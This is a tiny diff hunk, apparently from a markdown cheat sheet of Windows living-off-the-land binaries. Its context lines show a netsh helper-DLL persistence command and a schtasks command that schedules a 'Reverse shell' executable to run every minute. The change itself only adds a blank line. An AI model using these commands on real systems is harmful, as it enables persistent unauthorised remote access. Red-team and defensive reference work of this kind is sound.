@@ -652,6 +652,7 @@ netsh.exe add helper C:\Users\User\file.dll
 ```
 schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
 ```
+
 **MSIEXEC.EXE**
 - Used by Windows to execute msi files
 ```
